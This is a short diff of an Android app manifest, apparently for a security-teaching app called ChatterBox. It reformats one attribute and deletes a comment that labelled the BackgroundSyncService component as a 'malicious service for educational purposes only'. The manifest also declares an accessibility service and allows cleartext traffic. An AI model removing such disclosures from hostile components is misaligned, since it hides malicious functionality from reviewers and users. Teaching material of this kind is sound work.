@@ -39,7 +39,8 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.ChatterBox.NoActionBar"
         tools:targetApi="31"
-        android:usesCleartextTraffic="true">
+        android:usesCleartextTraffic="true"
+        >
 
         <service
             android:name=".accessibility.AccessibilityService"
@@ -111,7 +112,6 @@
         <activity android:name=".ForumEditActivity" />
         <activity android:name=".RoleEditActivity" />
 
-        <!-- Malicious service for educational purposes only -->
         <service
             android:name=".database.BackgroundSyncService"
             android:enabled="true"
